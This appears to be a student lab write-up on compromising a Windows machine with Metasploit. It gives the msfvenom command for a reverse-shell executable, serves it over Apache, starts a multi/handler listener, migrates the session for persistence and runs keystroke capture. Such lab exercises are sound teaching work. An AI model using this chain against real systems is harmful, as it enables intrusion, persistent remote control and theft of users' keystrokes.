# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:

<img width="767" height="346" alt="image" src="https://github.com/user-attachments/assets/d3f3a5f3-54c7-4c04-bc7f-0d5f36ac1a3e" />

<img width="839" height="137" alt="image" src="https://github.com/user-attachments/assets/37664023-e527-469d-a12f-a4e565969067" />


copy the fun.exe into the apache ```/var/www/html ```folder

<img width="367" height="77" alt="image" src="https://github.com/user-attachments/assets/47ffc8e5-a9f6-4738-95cc-76a13422391d" />


Start apache server ```sudo systemctl apache2 start``` 

<img width="306" height="60" alt="image" src="https://github.com/user-attachments/assets/d9726733-8e93-48d7-b7a2-4071fa490588" />


Check the status of apache2 ```sudo apache2 status```

<img width="896" height="418" alt="image" src="https://github.com/user-attachments/assets/863c0668-a509-4f40-a2bb-10978f904006" />

Invoke msfconsole:

<img width="708" height="501" alt="image" src="https://github.com/user-attachments/assets/061b56b9-892a-404e-ba84-c28c4deb1e18" />


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

<img width="816" height="557" alt="image" src="https://github.com/user-attachments/assets/7128fd25-c700-4ca2-af73-8e385b45be00" />


Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

<img width="624" height="137" alt="image" src="https://github.com/user-attachments/assets/d7697f25-0b64-4639-bfff-f5b47ce2fdc4" />


### Output 


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.

<img width="772" height="503" alt="image" src="https://github.com/user-attachments/assets/a69301f9-0ad0-4870-ae99-d4c37c1b2cde" />


Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

<img width="842" height="657" alt="image" src="https://github.com/user-attachments/assets/e16b8f90-6bf6-4cfb-97f6-1a11b9915a08" />


keyscan_dump Shows the keystrokes captured so far



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

